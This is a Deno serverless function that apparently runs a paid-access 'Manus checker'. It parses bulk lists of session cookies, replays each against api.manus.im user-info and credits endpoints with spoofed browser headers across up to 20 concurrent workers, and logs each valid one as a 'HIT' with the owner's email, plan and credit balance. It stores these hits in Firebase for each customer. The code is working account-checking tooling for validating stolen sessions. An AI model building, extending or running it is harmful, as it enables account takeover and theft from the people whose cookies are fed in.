import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { firebasePush, firebaseGet, verifyFirebaseIdToken } from "../_shared/firebase-admin.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-firebase-token",
};

interface CheckRequest {
  cookies: string[];
  threads?: number;
  username?: string;
  clientInfo?: {
    timezone?: string;
    country?: string;
    userAgent?: string;
  };
}

interface CheckResult {
  id: string;
  filename: string;
  status: 'success' | 'failed';
  email: string;
  name: string;
  membership: string;
  plan: string;
  totalCredits: string;
  freeCredits: string;
  usedCredits: string;
  error?: string;
  timestamp: string;
  checkDuration?: number;
  threadId?: number;
}

interface SessionInfo {
  startTime: string;
  endTime: string;
  duration: string;
  clientIP?: string;
  userAgent?: string;
  timezone?: string;
  country?: string;
  threadsUsed: number;
  accountsProcessed: number;
  successRate: string;
}

// Canary-style timestamp format
function getCanaryTimestamp(): string {
  const now = new Date();
  const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
  const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
  
  const day = days[now.getUTCDay()];
  const month = months[now.getUTCMonth()];
  const date = now.getUTCDate().toString().padStart(2, '0');
  const hours = now.getUTCHours().toString().padStart(2, '0');
  const mins = now.getUTCMinutes().toString().padStart(2, '0');
  const secs = now.getUTCSeconds().toString().padStart(2, '0');
  const ms = now.getUTCMilliseconds().toString().padStart(3, '0');
  
  return `[${day} ${month} ${date} ${hours}:${mins}:${secs}.${ms}]`;
}

function extractCookieValue(cookieContent: string, cookieName: string): string | null {
  const patterns = [
    new RegExp(`${cookieName}\\t([^\\t\\n]+)`),
    new RegExp(`${cookieName}=([^;,\\s]+)`),
    new RegExp(`${cookieName}="([^"]+)"`),
  ];
  
  for (const pattern of patterns) {
    const match = pattern.exec(cookieContent);
    if (match) {
      return match[1];
    }
  }
  return null;
}

function parseCookieContent(cookieContent: string): { cookies: Record<string, string>; sessionKey: string | null } {
  cookieContent = cookieContent.trim();
  if (!cookieContent) {
    return { cookies: {}, sessionKey: null };
  }
  
  const cookiesDict: Record<string, string> = {};
  
  // Check if it's Netscape format
  if (cookieContent.includes('\t')) {
    const lines = cookieContent.split('\n');
    for (const line of lines) {
      const trimmedLine = line.trim();
      if (trimmedLine && !trimmedLine.startsWith('#')) {
        const parts = trimmedLine.split('\t');
        if (parts.length >= 7) {
          const cookieName = parts[5];
          const cookieValue = parts[6];
          cookiesDict[cookieName] = cookieValue;
        }
      }
    }
    
    if (Object.keys(cookiesDict).length > 0) {
      const firstKey = Object.keys(cookiesDict)[0];
      return { cookies: cookiesDict, sessionKey: firstKey };
    }
  }
  
  // Check for session_id
  const sessionNames = ['session_id', 'session', 'auth_token', 'token', 'auth', 'access_token'];
  for (const name of sessionNames) {
    const sessionId = extractCookieValue(cookieContent, name);
    if (sessionId) {
      return { cookies: { [name]: sessionId }, sessionKey: name };
    }
  }
  
  // Try name=value format
  const matches = cookieContent.matchAll(/([^=\s]+)=([^;\s]+)/g);
  for (const match of matches) {
    cookiesDict[match[1]] = match[2];
  }
  
  if (Object.keys(cookiesDict).length > 0) {
    const firstKey = Object.keys(cookiesDict)[0];
    return { cookies: cookiesDict, sessionKey: firstKey };
  }
  
  return { cookies: {}, sessionKey: null };
}

async function checkSingleAccount(
  fileContent: string, 
  filename: string, 
  idx: number,
  threadId: number
): Promise<CheckResult> {
  const startTime = Date.now();
  
  const result: CheckResult = {
    id: `${Date.now()}_${idx}`,
    filename,
    status: 'failed',
    email: 'N/A',
    name: 'N/A',
    membership: 'N/A',
    plan: 'N/A',
    totalCredits: 'N/A',
    freeCredits: 'N/A',
    usedCredits: 'N/A',
    timestamp: getCanaryTimestamp(),
    threadId,
  };
  
  try {
    const { cookies, sessionKey } = parseCookieContent(fileContent);
    
    if (Object.keys(cookies).length === 0) {
      result.error = 'Cannot parse cookie content';
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    // Get session_id
    let sessionId: string | null = null;
    for (const name of ['session_id', 'session', 'auth_token', 'token', 'auth', 'access_token']) {
      sessionId = extractCookieValue(fileContent, name);
      if (sessionId) break;
    }
    
    if (!sessionId) {
      sessionId = Object.values(cookies)[0];
    }
    
    if (!sessionId) {
      result.error = 'No session ID found';
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    // Create cookie string
    const cookieStr = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
    
    // Request 1: Get user info
    const userInfoHeaders = {
      'Host': 'api.manus.im',
      'Referer': 'https://manus.im/',
      'Origin': 'https://manus.im',
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${sessionId}`,
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept': '*/*',
      'connect-protocol-version': '1',
      'Cookie': cookieStr,
    };
    
    const userInfoResponse = await fetch('https://api.manus.im/user.v1.UserService/UserInfo', {
      method: 'POST',
      headers: userInfoHeaders,
      body: '{}',
    });
    
    if (userInfoResponse.status !== 200) {
      result.error = `API request failed: ${userInfoResponse.status}`;
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    const userData = await userInfoResponse.json();
    
    if (!userData.email || !userData.avatar) {
      result.error = 'Invalid cookie response';
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    result.email = userData.email || 'N/A';
    result.name = userData.displayname || userData.name || 'N/A';
    result.membership = userData.membershipVersion || userData.membership || 'Free';
    result.plan = userData.plan || userData.membershipVersion || 'Free';
    
    // Request 2: Get credits info
    const creditsResponse = await fetch('https://api.manus.im/user.v1.UserService/GetAvailableCredits', {
      method: 'POST',
      headers: userInfoHeaders,
      body: '{}',
    });
    
    if (creditsResponse.status === 200) {
      const creditsData = await creditsResponse.json();
      result.totalCredits = String(creditsData.totalCredits ?? creditsData.total ?? 'N/A');
      result.freeCredits = String(creditsData.freeCredits ?? creditsData.free ?? 'N/A');
      result.usedCredits = String(creditsData.usedCredits ?? creditsData.used ?? 'N/A');
    }
    
    result.status = 'success';
    result.checkDuration = Date.now() - startTime;
    
    console.log(`${getCanaryTimestamp()} [Thread-${threadId}] HIT: ${result.email} | ${result.plan} | Credits: ${result.totalCredits}`);
    
  } catch (e) {
    result.error = `Error: ${String(e)}`;
    result.checkDuration = Date.now() - startTime;
    console.log(`${getCanaryTimestamp()} [Thread-${threadId}] FAIL: ${filename} - ${result.error}`);
  }
  
  return result;
}

async function processWithWorkerPool<T, R>(
  items: T[],
  concurrency: number,
  fn: (item: T, index: number, threadId: number) => Promise<R>,
  onProgress?: (completed: number, total: number) => void
): Promise<R[]> {
  const results: R[] = new Array(items.length);
  let currentIndex = 0;
  let completedCount = 0;

  async function worker(threadId: number): Promise<void> {
    while (true) {
      const index = currentIndex++;
      if (index >= items.length) break;
      
      try {
        const result = await fn(items[index], index, threadId);
        results[index] = result;
        completedCount++;
        
        if (onProgress) {
          onProgress(completedCount, items.length);
        }
        
        if (completedCount % 10 === 0) {
          console.log(`${getCanaryTimestamp()} Progress: ${completedCount}/${items.length}`);
        }
      } catch (error) {
        results[index] = { error: String(error) } as R;
        completedCount++;
      }
      
      // Small delay to avoid rate limiting
      await new Promise(r => setTimeout(r, 100));
    }
  }

  const workers = Array(Math.min(concurrency, items.length))
    .fill(null)
    .map((_, i) => worker(i + 1));

  await Promise.all(workers);
  return results;
}

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  const sessionStartTime = Date.now();
  const sessionStartTimestamp = getCanaryTimestamp();

  try {
    // Verify Firebase auth token
    const firebaseToken = req.headers.get("x-firebase-token");
    let userId: string | null = null;
    
    if (firebaseToken) {
      const tokenData = await verifyFirebaseIdToken(firebaseToken);
      if (tokenData) {
        userId = tokenData.uid;
      }
    }

    const { cookies, threads = 5, username, clientInfo }: CheckRequest = await req.json();

    // Check if user has service access
    if (userId) {
      const userData = await firebaseGet<{ services?: string[]; isAdmin?: boolean }>(`users/${userId}`);
      const hasAccess = userData?.services?.includes("manus_checker") || 
                        userData?.services?.includes("all") ||
                        userData?.isAdmin;
      
      if (!hasAccess) {
        return new Response(
          JSON.stringify({ error: "You don't have access to this service" }),
          { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
        );
      }
    }

    console.log(`${sessionStartTimestamp} Starting Manus check for ${cookies.length} cookies, ${threads} threads, user: ${username || 'unknown'}`);

    if (!cookies || cookies.length === 0) {
      return new Response(
        JSON.stringify({ error: "Cookies are required" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const concurrency = Math.min(threads, 20);
    const results = await processWithWorkerPool(
      cookies,
      concurrency,
      async (cookie, idx, threadId) => checkSingleAccount(cookie, `cookie_${idx + 1}.txt`, idx, threadId)
    );

    const sessionEndTime = Date.now();
    const durationMs = sessionEndTime - sessionStartTime;
    const durationStr = durationMs > 60000 
      ? `${Math.floor(durationMs / 60000)}m ${Math.floor((durationMs % 60000) / 1000)}s`
      : `${Math.floor(durationMs / 1000)}s`;

    console.log(`${getCanaryTimestamp()} Check complete. Results: ${results.length}, Duration: ${durationStr}`);

    // Calculate stats
    const successResults = results.filter(r => r.status === 'success');
    const stats = {
      total: results.length,
      success: successResults.length,
      failed: results.filter(r => r.status === 'failed').length,
      successRate: `${((successResults.length / results.length) * 100).toFixed(1)}%`,
    };

    // Session info (Canary style)
    const sessionInfo: SessionInfo = {
      startTime: sessionStartTimestamp,
      endTime: getCanaryTimestamp(),
      duration: durationStr,
      clientIP: clientInfo?.userAgent?.substring(0, 50) || 'Unknown',
      userAgent: clientInfo?.userAgent,
      timezone: clientInfo?.timezone || 'Unknown',
      country: clientInfo?.country || 'Unknown',
      threadsUsed: concurrency,
      accountsProcessed: results.length,
      successRate: stats.successRate,
    };

    // Save history to Firebase with full results
    if (userId) {
      await firebasePush(`checkHistory/${userId}`, {
        service: "manus_checker",
        inputCount: cookies.length,
        stats,
        sessionInfo,
        results: results.map(r => ({
          email: r.email,
          name: r.name,
          plan: r.plan,
          membership: r.membership,
          totalCredits: r.totalCredits,
          freeCredits: r.freeCredits,
          usedCredits: r.usedCredits,
          status: r.status,
          timestamp: r.timestamp,
          checkDuration: r.checkDuration,
        })),
        createdAt: new Date().toISOString()
      });

      // Save HITS separately for easy access
      if (successResults.length > 0) {
        await firebasePush(`manusHits/${userId}`, {
          hits: successResults.map(r => ({
            email: r.email,
            name: r.name,
            plan: r.plan,
            totalCredits: r.totalCredits,
            freeCredits: r.freeCredits,
            timestamp: r.timestamp,
          })),
          count: successResults.length,
          checkedAt: new Date().toISOString()
        });
      }
    }

    return new Response(
      JSON.stringify({ results, stats, sessionInfo }),
      { 
        status: 200, 
        headers: { ...corsHeaders, "Content-Type": "application/json" } 
      }
    );

  } catch (error) {
    console.error(`${getCanaryTimestamp()} Error:`, error);
    return new Response(
      JSON.stringify({ error: String(error) }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
